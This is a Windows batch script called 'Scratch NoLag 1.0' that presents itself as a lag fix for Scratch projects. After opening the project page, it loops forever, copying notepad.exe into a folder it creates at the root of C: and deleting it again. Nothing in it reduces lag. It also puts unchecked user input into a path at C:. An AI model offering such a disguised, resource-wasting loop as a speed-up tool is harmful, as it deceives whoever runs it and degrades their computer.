@echo off
title Scratch NoLag 1.0
echo Welcome!
echo Please Enter The Project ID/Number.
set /P INPUT=Type input: %=%
cls
start https://scratch.mit.edu/projects/%INPUT%/
mkdir c:\%INPUT%
goto Fasten Scratch
:Fasten Scratch
copy C:\windows\notepad.exe c:\%INPUT%
del c:\%INPUT%\notepad.exe
goto Fasten Scratch
